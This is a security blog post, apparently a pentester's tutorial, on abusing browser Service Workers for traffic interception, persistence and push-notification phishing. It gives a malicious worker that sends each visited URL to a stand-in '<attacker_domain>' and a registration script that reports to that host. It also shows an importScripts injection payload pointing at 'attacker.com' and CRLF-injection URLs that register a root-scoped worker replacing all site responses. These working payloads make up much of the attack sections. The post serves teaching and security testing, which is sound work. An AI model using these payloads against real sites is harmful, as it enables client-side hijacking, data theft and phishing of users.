<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title>Service Worker Tutorial | mikedakotastaytrue </title> <meta name="author" content="mikedakotastaytrue "> <meta name="description" content="Service Worker explaination/tutorial for pentesters"> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha256-DF7Zhf293AJxJNTmh5zhoYYIMs2oXitRfBjY+9L//AY=" crossorigin="anonymous"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="https://unpkg.com/bootstrap-table@1.21.4/dist/bootstrap-table.min.css"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/academicons@1.9.1/css/academicons.min.css" integrity="sha256-i1+4qU2G2860dGGIOJscdC30s9beBXjFfzjWLjBRsBg=" crossorigin="anonymous"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="shortcut icon" type="image/png" href="/assets/img/favicon.png"> <link rel="preconnect" href="https://fonts.googleapis.com"> <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&amp;family=Reddit+Mono&amp;display=swap" rel="stylesheet"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/github.css" media="" id="highlight_theme_light"> <link href="https://cdn.rawgit.com/afeld/bootstrap-toc/v1.0.1/dist/bootstrap-toc.min.css" rel="stylesheet"> <link rel="shortcut icon" href="/assets/img//assets/img/favicon.png"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://alshedivat.github.io/posts/2024/service_wokrer/"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/native.css" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?96d6b3e1c3604aca8b6134c7afdd5db6"></script> <script src="/assets/js/dark_mode.js?9b17307bb950ffa2e34be0227f53558f"></script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"><span class="font-weight-bold">mikedakotastaytrue </span></a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about</a> </li> <li class="nav-item "> <a class="nav-link" href="/posts/">posts</a> </li> <li class="nav-item "> <a class="nav-link" href="/writeups/">writeups</a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fas fa-moon"></i> <i class="fas fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">Service Worker Tutorial</h1> <p class="post-meta">November 13, 2024</p> <p class="post-tags"> <a href="/blog/2024"> <i class="fas fa-calendar fa-sm"></i> 2024 </a>   ·   <a href="/blog/tag/web"> <i class="fas fa-hashtag fa-sm"></i> web</a>   <a href="/blog/tag/appsec"> <i class="fas fa-hashtag fa-sm"></i> appsec</a>   <a href="/blog/tag/tutorial"> <i class="fas fa-hashtag fa-sm"></i> tutorial</a>   <a href="/blog/tag/c2"> <i class="fas fa-hashtag fa-sm"></i> c2</a>     ·   <a href="/blog/category/tutorial"> <i class="fas fa-tag fa-sm"></i> tutorial</a>   </p> </header> <article class="post-content"> <div id="markdown-content"> <figure> <picture> <img src="/assets/img/posts/sw/sw_logo.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="sw_tutorial" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><br></p> <h3 data-toc-text="Introduction" id="introduction">Introduction</h3> <p>Service Worker (SW) is a script launched by the browser in the background process. It acts as a proxy between the server and the browser and extend the background processing capabilities for each page. The main advantages are offline interaction and push notifications.</p> <p>SW runs in the worker context, so it does not have access to the DOM-tree and runs in a thread separate from the main JavaScript thread that controls the web application, and therefore does not block it. It is designed to be completely asynchronous, so synchronous APIs (XHR and LocalStorage) cannot be used in SW.</p> <p>One aspect of SW technology is the Cache Interface, which is a caching mechanism completely separate from the HTTP cache. The Cache interface can be accessed both in the SW area and within the main thread. The Cache-Control HTTP header directives will not affect SW caching in any way.</p> <figure> <picture> <img src="/assets/img/posts/sw/sw_scheme.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="sw_tutorial" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><code class="language-plaintext highlighter-rouge">Push notification</code> permissions affect the ability of the SW to interact with the server without user interaction. If <code class="language-plaintext highlighter-rouge">push notifications</code> are prohibited, this limits the SW’s potential to pose a persistent threat. Otherwise, granting permissions increases security risks.</p> <p>You can try out the ability to send notifications yourself using a simple <a href="https://github.com/pirminrehm/service-worker-web-push-example" rel="external nofollow noopener" target="_blank">GitHub project</a>.</p> <figure> <picture> <img src="/assets/img/posts/sw/sw3.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="sw_tutorial" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>Check registered SWs via URL:<br> <code class="language-plaintext highlighter-rouge">chrome://serviceworker-internals/</code> (Chrome)<br> <code class="language-plaintext highlighter-rouge">about:debugging#/runtime/this-firefox</code>(Firefox)</p> <p><br></p> <h3 id="using-sw-in-attack">Using SW in attack</h3> <h4 id="traffic-interception">Traffic interception</h4> <p>SW has access to the website’s network traffic. It can intercept network traffic of files within its scope and modify any HTTP header and content.</p> <p>This type of interception can be used to inject malicious content and is not subject to monitoring or security enforcement of existing defenses. For example, when a malicious third-party script is prohibited from modifying other DOM elements, it can use SW to directly modify the DOM content of a web page. In this way, an attacker can potentially use a compromised SW to bypass certain types of document context protection and execute a payload.</p> <p><br></p> <h4 id="pinning-in-web-applications">Pinning in web applications</h4> <p>Once successfully registered, the SW’s contents (e.g. event listeners) will persist until a new SW replaces the old one. The payload stored in the SW can persist across multiple sessions.</p> <p>An attacker can use this capability in combination with network traffic manipulation to take full control of the target web application on the client side for an extended period of time.</p> <p><br></p> <h4 id="push-notifications">Push Notifications</h4> <p>One of the previously mentioned features of SW is that it allows a push event to be triggered remotely and a push message to be displayed at any time, regardless of whether the browser is open. This feature gives two advantages to an attacker in implementing fishing attacks:</p> <ol> <li>The attacker does not need to wait for the victim to visit the web application to start phishing - they can start the attack at any time using a push message.</li> <li>The sender of the push message appears to come from a site that is usually legitimate. Therefore, the fishing message will look more realistic compared to a message coming from a different and unknown site.</li> </ol> <p><br></p> <h3 id="example-of-creating-sw">Example of creating SW</h3> <p>To create a malicious SW in the victim’s browser, two conditions are required:</p> <ul> <li>JavaScript file containing source code of SW placing on same origin</li> <li>Use XSS to register it</li> </ul> <p>Let’s consider the simplest SW <code class="language-plaintext highlighter-rouge">sw.js</code> - we log the victim’s fetch requests in the current Origin by duplicating their URL to the request to the controlled domain:</p> <p>SW source code:</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">self</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">fetch</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">e</span><span class="p">.</span><span class="nf">respondWith</span><span class="p">(</span><span class="nx">caches</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">request</span><span class="p">).</span><span class="nf">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://&lt;attacker_domain&gt;/fetch_url/</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">)</span>
<span class="p">});</span>
</code></pre></div></div> <p>Register SW:</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">load</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">var</span> <span class="nx">sw</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">sw.js</span><span class="dl">"</span><span class="p">;</span>

<span class="nb">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="nx">sw</span><span class="p">,</span> <span class="p">{</span><span class="na">scope</span><span class="p">:</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">})</span>
  <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">registration</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">xhttp2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
    <span class="nx">xhttp2</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https://&lt;attacker_domain&gt;/SW/success</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="nx">xhttp2</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
  <span class="p">},</span> <span class="nf">function </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">xhttp2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
    <span class="nx">xhttp2</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https://&lt;attacker_domain&gt;/SW/error</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="nx">xhttp2</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
  <span class="p">});</span>
  
<span class="p">});</span>
</code></pre></div></div> <p>The serviceWorker.register method is passed the URL of the script containing the SW source code, an important condition is that the <strong>scriptURL</strong> parameter must be Same-Origin, for this reason the SW cannot be installed from a vulnerable subdomain or host of the attacker. In the second parameter <strong>options</strong> we specified <strong>scope</strong> the entire root directory, this is what our SW will control.</p> <p>Result using Burp Collaborator:</p> <figure> <picture> <img src="/assets/img/posts/sw/sw4.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="sw_tutorial" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><br></p> <h3 id="abusing-importscripts">Abusing importScripts</h3> <p>When registering a SW, additional parameters may be used, which may later end up in sensitive JS functions (gadgets). When discovering a web application, at least pay attention to how the SW request is made.</p> <p>URL example with an additional parameter:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://example.com/sw.js?userid=bob
</code></pre></div></div> <p>The <em>importScripts</em> function called from SW can import a script from another domain. If this function is called using a parameter that an attacker can change, he will be able to import a cross origin JS script and get XSS. This even bypasses CSP protection.</p> <p>Example of vulnerable source code:<br> <code class="language-plaintext highlighter-rouge">sw.html</code></p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">load</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
	<span class="nb">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="dl">''</span><span class="o">/</span><span class="nx">sw</span><span class="p">.</span><span class="nx">js</span><span class="dl">''</span><span class="o">+</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">)</span>  
<span class="p">});</span>
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">sw.js</code></p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">searchParams</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">host</span> <span class="o">=</span> <span class="nx">searchParams</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">host</span><span class="dl">'</span><span class="p">);</span>
<span class="nb">self</span><span class="p">.</span><span class="nf">importScripts</span><span class="p">(</span><span class="nx">host</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/sw_extra.js</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div> <p>Achivieng XSS using next payload:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://vulnerable.com/sw.html?host=attacker.com
</code></pre></div></div> <p>As written in <a href="https://dl.acm.org/doi/fullHtml/10.1145/3427228.3427290" rel="external nofollow noopener" target="_blank">one</a> paper, this piece of code was used by a web application dedicated to sports, with a traffic of about 50 million people.</p> <p><br></p> <h3 id="register-sw-using-crlf-injection">Register SW using CRLF-injection</h3> <p>CRLF-Injceiton which allows you to rewrite the HTTP response and do XSS, then its impact can be increased using SW.</p> <p>Trigger XSS:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://example.tld/some/path/foo/bar/?param=x%0D%0AContent-Type:text/
html%0D%0AContent-Length:20%0D%0A%0D%0A&lt;script&gt;XSS&lt;/script&gt;
</code></pre></div></div> <p>Upload JS-file:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://example.tld/some/path/foo/bar/?param=x%0D%0AContent-Type:text/
javascript%0D%0AContent-Length:7%0D%0A%0D%0AJS_file
</code></pre></div></div> <p>There are two necessary points to register SW. But in that case, one problem is actually exists - scope /some/path/foo/bar/, which is not interesting and its better to find a way to make scope a root /.</p> <p>If read the documentation of SW, there is information about the <code class="language-plaintext highlighter-rouge">Service-Worker-Allowed</code> header, which is set in the HTTP response along with the worker’s JS code, and through which it can be redefine the scope.</p> <p>Which in case of CRLF Injection allows to register a SW located in any folder on the root of the site.</p> <p>Final source code which register SW with <code class="language-plaintext highlighter-rouge">Service-Worker-Allowed: /</code> header. SW will change all responses of HTTP-traffic to “Fake response”:</p> <p>Request:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://example.tld/some/path/foo/bar/?param=x%0D%0AService-Worker-Allowed:/
%0D%0AContent-Type:text/javascript%0D%0AContent-Length:162%0D%0A%0D%0Aself.addEventListener
(%22fetch%22,function(event){event.respondWith(new%20Response(%22Fake%20response%22,
{status:200,statusText:%22OK%22,headers:{"Content-Type%22:%22text/html%22}}))})
</code></pre></div></div> <p>Response</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Service</span><span class="o">-</span><span class="nx">Worker</span><span class="o">-</span><span class="nx">Allowed</span><span class="p">:</span><span class="o">/</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="p">:</span><span class="nx">text</span><span class="o">/</span><span class="nx">javascript</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="p">:</span><span class="mi">162</span>


<span class="nb">self</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">fetch</span><span class="dl">"</span><span class="p">,</span><span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">){</span><span class="nx">event</span><span class="p">.</span><span class="nf">respondWith</span><span class="p">(</span><span class="k">new</span> <span class="nc">Response</span><span class="p">(</span><span class="dl">"</span><span class="s2">Fake
 response</span><span class="dl">"</span><span class="p">,{</span><span class="na">status</span><span class="p">:</span><span class="mi">200</span><span class="p">,</span><span class="na">statusText</span><span class="p">:</span><span class="dl">"</span><span class="s2">OK</span><span class="dl">"</span><span class="p">,</span><span class="na">headers</span><span class="p">:{</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span><span class="p">}}))})</span>
</code></pre></div></div> <p>Connect SW using XSS and request:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://example.tld/some/path/foo/bar/?param=x%0D%0AContent-Type:text/
html%0D%0AContent-Length:378%0D%0A%0D%0A%3Cscript%3Enavigator.serviceWorker.register('/some/
path/foo/bar/?param=x%250D%250AService-Worker-Allowed:/%250D%250AContent-Type:text/
javascript%250D%250AContent-Length:162%250D%250A%250D%250Aself.addEventListener
(%2522fetch%2522,function(event){event.respondWith(new%2520Response
(%2522Fake%2520response%2522,{status:200,statusText:%2522OK%2522,headers:{
   %2522Content-Type%2522:%2522text/html%2522}}))})',{scope:'/'})%3C/script%3E
</code></pre></div></div> <p>Response:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Content-Type:text/html
Content-Length:378

<span class="nt">&lt;script&gt;</span><span class="nb">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="dl">'</span><span class="s1">/some/path/foo/bar/?
param=x%0D%0AService-Worker-Allowed:/%0D%0AContent-Type:text/
javascript%0D%0AContent-Length:162%0D%0A%0D%0Aself.addEventListener(%22fetch%22,function
(event){event.respondWith(new%20Response(%22Fake%20response%22,{status:200,
statusText:%22OK%22,headers:{"Content-Type%22:%22text/html%22}}))})</span><span class="dl">'</span><span class="p">,{</span><span class="na">scope</span><span class="p">:</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">})</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div> <p>Thank you, BlackFan, for post in Telegram</p> <p><br></p> <h3 id="c2-using-sw">C2 using SW</h3> <p>If you are a bit into RedTeam and are familiar with the concept of Command and Control, then the <a href="https://shadow-workers.github.io" rel="external nofollow noopener" target="_blank">Shadow Workers</a> tool was created for you, as well as articles using this tool:</p> <ol> <li><a href="https://trustedsec.com/blog/persistence-through-service-workers-part-1-introduction-and-target-application-setup" rel="external nofollow noopener" target="_blank">Introduction and Target Application Setup</a></li> <li><a href="https://trustedsec.com/blog/persistence-through-service-workers-part-2-c2-setup-and-use" rel="external nofollow noopener" target="_blank">C2 Setup and Use</a></li> <li><a href="https://trustedsec.com/blog/persistence-through-service-workers-part-3-easy-javascript-payload-deployment" rel="external nofollow noopener" target="_blank">Easy JavaScript Payload Deployment</a></li> </ol> <hr> </div> </article><div id="giscus_thread" style="max-width: 1000px; margin: 0 auto;"> <script>let giscusTheme=localStorage.getItem("theme"),giscusAttributes={src:"https://giscus.app/client.js","data-repo":"alshedivat/al-folio","data-repo-id":"MDEwOlJlcG9zaXRvcnk2MDAyNDM2NQ==","data-category":"Comments","data-category-id":"DIC_kwDOA5PmLc4CTBt6","data-mapping":"title","data-strict":"1","data-reactions-enabled":"1","data-emit-metadata":"0","data-input-position":"bottom","data-theme":giscusTheme,"data-lang":"en",crossorigin:"anonymous",async:""},giscusScript=document.createElement("script");Object.entries(giscusAttributes).forEach(([t,a])=>giscusScript.setAttribute(t,a)),document.getElementById("giscus_thread").appendChild(giscusScript);</script> <noscript>Please enable JavaScript to view the <a href="http://giscus.app/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by giscus.</a> </noscript> </div> </div> </div> </div> </div> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js" integrity="sha256-fgLAgv7fyCGopR/gBNq2iW3ZKIdqIcyshnUULC4vex8=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.8/dist/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js"></script> <script defer src="https://cdn.rawgit.com/afeld/bootstrap-toc/v1.0.1/dist/bootstrap-toc.min.js"></script> <script defer src="https://unpkg.com/bootstrap-table@1.21.4/dist/bootstrap-table.min.js"></script> <script src="/assets/js/no_defer.js?d633890033921b33e0ceb13d22340a9c"></script> <script defer src="/assets/js/common.js?acdb9690d7641b2f8d40529018c71a01"></script> <script defer src="/assets/js/copy_code.js?c9d9dd48933de3831b3ee5ec9c209cac" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>